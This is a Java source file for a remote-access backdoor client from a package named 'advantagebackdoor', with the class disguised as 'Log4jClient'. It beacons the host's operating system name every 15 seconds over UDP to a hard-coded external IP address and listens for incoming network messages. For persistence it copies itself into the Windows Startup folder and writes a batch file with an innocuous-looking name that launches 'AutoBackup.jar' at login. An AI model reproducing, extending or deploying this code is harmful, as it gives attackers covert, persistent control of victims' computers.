package me.faintcloudy.advantagebackdoor.client;

import com.alibaba.fastjson.JSON;
import me.faintcloudy.advantagebackdoor.client.guise.Guise;
import me.faintcloudy.advantagebackdoor.client.message.NetworkMessageController;
import me.faintcloudy.advantagebackdoor.api.message.play.client.KeepAliveMessage;
import me.faintcloudy.advantagebackdoor.api.message.NetworkMessage;

import java.io.*;
import java.net.*;

public class Log4jClient {
    private static Log4jClient instance = null;

    public static void setInstance(Log4jClient instance) {
        Log4jClient.instance = instance;
    }

    public static Log4jClient getInstance() {
        return instance;
    }

    public static void main(String[] args) {
        Log4jClient client = new Log4jClient();
        setInstance(client);
        client.load(args);

    }

    DatagramSocket socket;
    NetworkMessageController networkMessageController;
    InetAddress serverAddress;
    int serverPort = -1;
    public void load(String[] args) {

        boolean gui = false;
        for (String inputArgument : args) {
            System.out.println(inputArgument);
            if (inputArgument.equalsIgnoreCase("-gui"))
            {
                gui = true;
                break;
            }
        }
        if (gui)
            Guise.main();
        try {
            serverAddress = InetAddress.getByName("116.208.31.135");
        } catch (UnknownHostException e) {
            System.out.println("无效的 IP 地址: ");
            e.printStackTrace();
            System.exit(0);
        }
        serverPort = 25565;


        try {
            this.socket = new DatagramSocket(7123);
        } catch (SocketException e) {
            System.out.println("创建 Socket 时发生错误: ");
            e.printStackTrace();
            System.exit(0);
        }

        networkMessageController = new NetworkMessageController();
        networkMessageController.startListening();
        System.out.println("已启用监听");
        new Thread(() -> {
            while (true) {
                this.sendMessage(new KeepAliveMessage(System.getProperty("os.name")));
                try {
                    Thread.sleep(15000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();
        this.spread();
    }

    public void spread()
    {
        final String startUpFolder = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
        File batFile = new File(startUpFolder, "h12@Hash256.bat");
        String path = this.getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
        try {
            Runtime.getRuntime().exec("cmd /c copy " + path + " " + startUpFolder);
            if (!batFile.exists())
                Runtime.getRuntime().exec("cmd /c copy nul " + startUpFolder + "\\h12@Hash256.bat");
            Runtime.getRuntime().exec("cmd /c echo java -jar AutoBackup.jar>" + startUpFolder + "\\" + batFile.getName());
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public DatagramSocket getSocket() {
        return socket;
    }

    public void sendMessage(NetworkMessage message) {
        try {
            byte[] bytes = message.serialize();
            socket.send(new DatagramPacket(bytes, bytes.length, serverAddress, serverPort));
        } catch (IOException e) {
            System.out.println("发送信息 " + JSON.toJSONString(message) + " 时发生错误: ");
            e.printStackTrace();
        }
    }
}
